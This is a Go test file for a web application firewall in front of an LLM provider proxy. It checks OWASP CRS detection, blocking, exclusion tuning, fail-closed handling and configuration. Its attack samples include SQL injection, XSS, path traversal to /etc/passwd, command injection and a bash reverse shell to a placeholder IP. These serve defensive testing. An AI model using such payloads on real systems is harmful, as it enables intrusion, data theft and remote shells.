package wafsvc

// engine_test.go — M3-1 验收测试（技术实现方案 §2.1 判据 1~5）。
// CRS 用例集使用内嵌 OWASP CRS 4.25.0 真规则（662 条），非 mock。

import (
	"bytes"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// sample 一条 CRS 用例（attack=true 期望命中攻击规则；false 期望零命中）。
type sample struct {
	name   string
	args   map[string][]string
	body   string
	ua     string
	attack bool
}

// crsSamples OWASP CRS 核心用例集（26 条：14 正/12 负向）。
var crsSamples = []sample{
	// —— 正向（攻击，期望命中 attack-* 规则） ——
	{"sqli-get-or", map[string][]string{"q": {"1' OR 1=1--"}}, "", "my-app/1.0", true},
	{"sqli-get-union", map[string][]string{"q": {"1 UNION SELECT password FROM users"}}, "", "my-app/1.0", true},
	{"sqli-get-comment", map[string][]string{"id": {"1'; DROP TABLE users;--"}}, "", "my-app/1.0", true},
	{"sqli-body-or", nil, `{"q":"1' OR 1=1--"}`, "my-app/1.0", true},
	{"sqli-body-union", nil, `{"q":"UNION SELECT * FROM users"}`, "my-app/1.0", true},
	{"xss-get-script", map[string][]string{"q": {"<script>alert(1)</script>"}}, "", "my-app/1.0", true},
	{"xss-get-svg", map[string][]string{"q": {"<svg onload=alert(1)>"}}, "", "my-app/1.0", true},
	{"xss-body-img", nil, `{"q":"<img src=x onerror=alert(1)>"}`, "my-app/1.0", true},
	{"lfi-get-etc-passwd", map[string][]string{"file": {"../../etc/passwd"}}, "", "my-app/1.0", true},
	{"lfi-get-win-ini", map[string][]string{"file": {`..\..\windows\win.ini`}}, "", "my-app/1.0", true},
	{"rce-get-cat", map[string][]string{"cmd": {";cat /etc/passwd"}}, "", "my-app/1.0", true},
	{"rce-get-bash", map[string][]string{"cmd": {"$(bash -i >& /dev/tcp/1.2.3.4/4444 0>&1)"}}, "", "my-app/1.0", true},
	{"scanner-ua-sqlmap", nil, "", "sqlmap/1.0", true},
	{"php-inject-get", map[string][]string{"q": {`<?php system('id'); ?>`}}, "", "my-app/1.0", true},
	// —— 负向（正常业务，期望零命中/allow） ——
	{"benign-empty", nil, "", "my-app/1.0", false},
	{"benign-limit", map[string][]string{"limit": {"10"}}, "", "my-app/1.0", false},
	{"benign-model", map[string][]string{"model": {"gpt-4o"}}, "", "my-app/1.0", false},
	{"benign-query-en", map[string][]string{"q": {"hello world"}}, "", "my-app/1.0", false},
	{"benign-query-zh", map[string][]string{"q": {"请总结以下内容"}}, "", "my-app/1.0", false},
	{"benign-json-chat", nil, `{"model":"gpt-4o","messages":[{"role":"user","content":"hello"}]}`, "my-app/1.0", false},
	{"benign-json-zh", nil, `{"q":"请帮我写一段 Python 排序代码"}`, "my-app/1.0", false},
	{"benign-json-math", nil, `{"q":"what is 1+1?"}`, "my-app/1.0", false},
	{"benign-json-prompt", nil, `{"prompt":"Summarize the meeting notes","max_tokens":512}`, "my-app/1.0", false},
	{"benign-sdk-ua", nil, `{"q":"hi"}`, "OpenAI/Python 1.40.0", false},
	{"benign-path-models", nil, "", "my-app/1.0", false},
	{"benign-json-nested", nil, `{"a":{"b":[1,2,3]},"stream":true}`, "my-app/1.0", false},
}

func reqOf(s sample) WafRequest {
	uri := "/provider/openai/v1/chat"
	if s.name == "benign-path-models" {
		uri = "/provider/openai/v1/models"
	}
	hdrs := map[string][]string{
		"User-Agent":   {s.ua},
		"Content-Type": {"application/json"},
		"X-Tenant-Id":  {"acme"},
	}
	return WafRequest{
		Method: "POST", URI: uri, Host: "example.com", Headers: hdrs,
		GetArgs: s.args, Body: []byte(s.body), Tenant: "acme", Path: strings.SplitN(uri, "?", 2)[0],
	}
}

// TestM31CRSCaseSet 判据 2：26 条 OWASP CRS 正/负向用例（检测模式）。
func TestM31CRSCaseSet(t *testing.T) {
	eng, err := NewEngine(DefaultConfig())
	if err != nil {
		t.Fatalf("引擎加载失败: %v", err)
	}
	if len(crsSamples) < 20 {
		t.Fatal("用例集须 ≥20 条")
	}
	for _, s := range crsSamples {
		dec, err := eng.Eval(reqOf(s))
		if err != nil {
			t.Fatalf("%s: Eval 失败: %v", s.name, err)
		}
		hit := len(dec.RuleIDs) > 0
		if hit != s.attack {
			t.Errorf("%s: 命中=%v（rules=%v），want 命中=%v", s.name, hit, dec.RuleIDs, s.attack)
		}
		want := WafActionAllow
		if s.attack {
			want = WafActionDetect
		}
		if dec.Action != want {
			t.Errorf("%s: Action=%s，want %s", s.name, dec.Action, want)
		}
		if dec.Version == "" {
			t.Errorf("%s: Version 为空", s.name)
		}
	}
}

// TestM31BlockingMode 判据 2/5：阻断模式下攻击请求返回 block（Coraza 中断 403），正常请求放行。
func TestM31BlockingMode(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Mode = ModeBlocking
	eng, err := NewEngine(cfg)
	if err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"sqli-body-or", "xss-get-script", "lfi-get-etc-passwd", "sqli-get-or"} {
		for _, s := range crsSamples {
			if s.name != name {
				continue
			}
			dec, err := eng.Eval(reqOf(s))
			if err != nil {
				t.Fatalf("%s: %v", name, err)
			}
			if dec.Action != WafActionBlock {
				t.Errorf("%s: Action=%s（rules=%v），want block", name, dec.Action, dec.RuleIDs)
			}
		}
	}
	dec, err := eng.Eval(reqOf(crsSamples[14])) // benign-empty
	if err != nil || dec.Action != WafActionAllow {
		t.Fatalf("正常请求应放行: dec=%+v err=%v", dec, err)
	}
}

// TestM31ExclusionTuning 判据 3：排除表按 tenant/location/rule_id 消除误杀，Reload 原子换入并落审计。
func TestM31ExclusionTuning(t *testing.T) {
	eng, err := NewEngine(DefaultConfig())
	if err != nil {
		t.Fatal(err)
	}
	// LLM 提示词里含 SQL 术语会命中 942190（真实误杀样本）。
	fp := WafRequest{
		Method: "POST", URI: "/provider/openai/v1/chat", Host: "example.com",
		Headers: map[string][]string{"User-Agent": {"my-app/1.0"}, "Content-Type": {"application/json"}},
		Body:    []byte(`{"q":"please summarize: union select is a SQL clause"}`),
		Tenant:  "acme", Path: "/provider/openai/v1/chat",
	}
	dec, err := eng.Eval(fp)
	if err != nil {
		t.Fatal(err)
	}
	if len(dec.RuleIDs) == 0 {
		t.Fatal("误杀样本应先命中攻击规则（排除表才有意义）")
	}
	v0 := eng.Version()
	xs := []WafExclusion{{Tenant: "acme", Location: "/provider/openai/.*", RuleID: "942190", Reason: "LLM 提示词含 SQL 术语豁免"}}
	if err := eng.Reload(RuleSetBundle{Paranoia: 1, Excludes: xs}); err != nil {
		t.Fatalf("排除表换入失败: %v", err)
	}
	if eng.Version() == v0 {
		t.Fatal("Reload 后版本应变化（进审计）")
	}
	dec2, err := eng.Eval(fp)
	if err != nil {
		t.Fatal(err)
	}
	if dec2.Action != WafActionAllow || len(dec2.RuleIDs) != 0 {
		t.Fatalf("排除后应放行，got action=%s rules=%v", dec2.Action, dec2.RuleIDs)
	}
	// 另一租户不受该排除影响（tenant 粒度生效）。
	fp.Tenant = "other"
	dec3, err := eng.Eval(fp)
	if err != nil {
		t.Fatal(err)
	}
	if len(dec3.RuleIDs) == 0 {
		t.Fatal("排除项不应跨租户生效")
	}
}

// TestM31ValidateExcludes 排除项合法性（rule_id=all 须 reason；location 正则须可编译）。
func TestM31ValidateExcludes(t *testing.T) {
	bad := []WafExclusion{
		{Tenant: "", RuleID: "942190"},
		{Tenant: "acme", Location: "[", RuleID: "942190"},
		{Tenant: "acme", RuleID: ""},
		{Tenant: "acme", RuleID: "abc"},
		{Tenant: "acme", RuleID: "all"},
	}
	for i, x := range bad {
		if err := validateExclude(x); err == nil {
			t.Errorf("负例 %d 应拒绝: %+v", i, x)
		}
	}
	if err := validateExclude(WafExclusion{Tenant: "acme", RuleID: "all", Reason: "灰度期临时放行"}); err != nil {
		t.Fatalf("合法 all 应放行: %v", err)
	}
}

// TestM31ReloadFailureKeepsOld 判据 5/§2.5：Reload 失败保持旧集。
func TestM31ReloadFailureKeepsOld(t *testing.T) {
	eng, err := NewEngine(DefaultConfig())
	if err != nil {
		t.Fatal(err)
	}
	v0 := eng.Version()
	if err := eng.Reload(RuleSetBundle{Paranoia: 9}); err == nil {
		t.Fatal("非法 paranoia 应拒绝")
	}
	if eng.Version() != v0 {
		t.Fatal("失败后版本不应变化（旧集保持）")
	}
}

// TestM31ChecksumVersion 判据 2：规则集校验和确定性 + 版本含定版信息。
func TestM31ChecksumVersion(t *testing.T) {
	eng, err := NewEngine(DefaultConfig())
	if err != nil {
		t.Fatal(err)
	}
	if len(eng.Checksum()) != 64 {
		t.Fatalf("校验和应为 sha256 hex，got %q", eng.Checksum())
	}
	other, _ := crsChecksum()
	if other != eng.Checksum() {
		t.Fatal("校验和不确定（两次计算不一致）")
	}
	if !strings.Contains(eng.Version(), "crs-"+CRSVersion) || !strings.Contains(eng.Version(), "coraza-"+CorazaVersion) {
		t.Fatalf("版本串缺定版信息: %s", eng.Version())
	}
}

// ---------- HTTP 过滤器 ----------

type stubErrEngine struct{ err error }

func (s *stubErrEngine) Eval(WafRequest) (WafDecision, error) { return WafDecision{}, s.err }
func (s *stubErrEngine) Reload(RuleSetBundle) error           { return nil }
func (s *stubErrEngine) Version() string                      { return "stub-v0" }

func echoHandler() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	})
}

func providerReq(body string) *http.Request {
	r := httptest.NewRequest(http.MethodPost, "/provider/openai/v1/chat", strings.NewReader(body))
	r.Header.Set(TenantHeader, "acme")
	r.Header.Set("User-Agent", "my-app/1.0")
	r.Header.Set("Content-Type", "application/json")
	return r
}

// TestM31FilterFailClosed 判据 5：引擎故障——检测模式放行+告警，阻断模式 403；均落审计。
func TestM31FilterFailClosed(t *testing.T) {
	for _, tc := range []struct {
		mode string
		want int
		hdr  string
	}{
		{ModeDetection, http.StatusOK, "fail_open"},
		{ModeBlocking, http.StatusForbidden, "fail_closed"},
	} {
		cfg := DefaultConfig()
		cfg.Mode = tc.mode
		var events []WafAuditEvent
		f := NewFilter(&stubErrEngine{err: errors.New("engine down")}, echoHandler(), cfg,
			func(ev WafAuditEvent) { events = append(events, ev) })
		w := httptest.NewRecorder()
		f.ServeHTTP(w, providerReq(`{"q":"hi"}`))
		if w.Code != tc.want {
			t.Errorf("mode=%s: status=%d，want %d", tc.mode, w.Code, tc.want)
		}
		if w.Header().Get("X-WAF-Decision") != tc.hdr {
			t.Errorf("mode=%s: X-WAF-Decision=%q，want %q", tc.mode, w.Header().Get("X-WAF-Decision"), tc.hdr)
		}
		if len(events) != 1 || events[0].Reason == "" {
			t.Errorf("mode=%s: 故障事件应落审计并带原因，got %+v", tc.mode, events)
		}
	}
}

// TestM31FilterBlockAndAudit 阻断模式端到端：403 + 审计事件命中规则 ID。
func TestM31FilterBlockAndAudit(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Mode = ModeBlocking
	eng, err := NewEngine(cfg)
	if err != nil {
		t.Fatal(err)
	}
	var events []WafAuditEvent
	f := NewFilter(eng, echoHandler(), cfg, func(ev WafAuditEvent) { events = append(events, ev) })
	w := httptest.NewRecorder()
	f.ServeHTTP(w, providerReq(`{"q":"1' OR 1=1--"}`))
	if w.Code != http.StatusForbidden {
		t.Fatalf("status=%d，want 403: %s", w.Code, w.Body.String())
	}
	if len(events) != 1 || events[0].Action != WafActionBlock || len(events[0].RuleIDs) == 0 {
		t.Fatalf("阻断事件应带规则 ID，got %+v", events)
	}
	if f.Stats().Blocked != 1 {
		t.Fatalf("Blocked 指标 = %d，want 1", f.Stats().Blocked)
	}
}

// TestM31FilterBodyLimit 判据 4：超限跳过 body 检查但不丢请求（上游收到完整 body），指标留痕。
func TestM31FilterBodyLimit(t *testing.T) {
	cfg := DefaultConfig()
	cfg.BodyMaxBytes = 32
	eng, err := NewEngine(cfg)
	if err != nil {
		t.Fatal(err)
	}
	var got []byte
	up := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got, _ = io.ReadAll(r.Body)
		w.WriteHeader(http.StatusOK)
	})
	f := NewFilter(eng, up, cfg, nil)
	big := strings.Repeat("A", 128) + `1' OR 1=1--`
	w := httptest.NewRecorder()
	f.ServeHTTP(w, providerReq(big))
	if w.Code != http.StatusForbidden && w.Code != http.StatusOK {
		t.Fatalf("status=%d", w.Code)
	}
	if !bytes.Equal(got, []byte(big)) {
		t.Fatalf("超限请求体未完整还原：got %d bytes，want %d", len(got), len(big))
	}
	if f.Stats().BodySkipped != 1 {
		t.Fatalf("BodySkipped = %d，want 1", f.Stats().BodySkipped)
	}
}

// TestM31FilterScopeAndTenantSwitch 判据 1/防护边界：非 /provider/ 路径直通、per-tenant 关闭。
func TestM31FilterScopeAndTenantSwitch(t *testing.T) {
	eng, err := NewEngine(DefaultConfig())
	if err != nil {
		t.Fatal(err)
	}
	f := NewFilter(eng, echoHandler(), DefaultConfig(), nil)
	// 密态路径不进 WAF。
	w1 := httptest.NewRecorder()
	r1 := httptest.NewRequest(http.MethodPost, "/infer", strings.NewReader("{}"))
	f.ServeHTTP(w1, r1)
	if f.Stats().Evaluated != 0 {
		t.Fatal("非 /provider/ 路径不应评估")
	}
	// per-tenant 关闭。
	f.SetTenantPolicy("acme", TenantPolicy{Enabled: false})
	w2 := httptest.NewRecorder()
	f.ServeHTTP(w2, providerReq(`{"q":"1' OR 1=1--"}`))
	if w2.Code != http.StatusOK || f.Stats().Evaluated != 0 {
		t.Fatalf("per-tenant 关闭应直通: status=%d stats=%+v", w2.Code, f.Stats())
	}
}

// TestM31FilterExcludesReloadAudit 排除表变更落审计（§2.1 判据 3）。
func TestM31FilterExcludesReloadAudit(t *testing.T) {
	eng, err := NewEngine(DefaultConfig())
	if err != nil {
		t.Fatal(err)
	}
	var events []WafAuditEvent
	f := NewFilter(eng, echoHandler(), DefaultConfig(), func(ev WafAuditEvent) { events = append(events, ev) })
	if err := f.ReloadExcludes([]WafExclusion{{Tenant: "acme", RuleID: "942190", Reason: "误杀调优"}}); err != nil {
		t.Fatal(err)
	}
	if len(events) != 1 || events[0].Action != "excludes_reload" || events[0].Version == "" {
		t.Fatalf("调优变更应落审计并带版本，got %+v", events)
	}
}

// TestM31ConfigFromEnv 安装期参数：默认值、非法值 fail-closed、CRS 定版校验、排除表加载。
func TestM31ConfigFromEnv(t *testing.T) {
	for k, v := range map[string]string{
		"WAF_MODE": "bogus", "WAF_CRS_VERSION": "4.0.0", "WAF_PARANOIA_LEVEL": "9",
		"WAF_BODY_MAX_BYTES": "0", "WAF_FAIL_MODE": "maybe",
	} {
		t.Setenv(k, v)
		if _, err := ConfigFromEnv(); err == nil {
			t.Errorf("%s=%q 应拒绝", k, v)
		}
		os.Unsetenv(k)
	}
	dir := t.TempDir()
	p := filepath.Join(dir, "excludes.json")
	if err := os.WriteFile(p, []byte(`[{"tenant":"acme","rule_id":"942190","reason":"x"}]`), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("WAF_EXCLUDES_PATH", p)
	t.Setenv("WAF_MODE", ModeBlocking)
	c, err := ConfigFromEnv()
	if err != nil {
		t.Fatalf("合法配置应放行: %v", err)
	}
	if c.Mode != ModeBlocking || len(c.Excludes) != 1 || c.CRSVersion != CRSVersion {
		t.Fatalf("配置解析异常: %+v", c)
	}
	if _, err := LoadExcludes("relative.json"); err == nil {
		t.Fatal("相对路径应拒绝（安装期受信输入）")
	}
}

// TestM31PerfSanity 判据 4：200 次评估无空转/无超时（真实压测 RPS 基线属 M3-3 取证环节）。
func TestM31PerfSanity(t *testing.T) {
	eng, err := NewEngine(DefaultConfig())
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	for i := 0; i < 200; i++ {
		if _, err := eng.Eval(reqOf(crsSamples[20])); err != nil {
			t.Fatal(err)
		}
	}
	if d := time.Since(start); d > 30*time.Second {
		t.Fatalf("200 次评估耗时 %v（疑似失控空转）", d)
	}
}
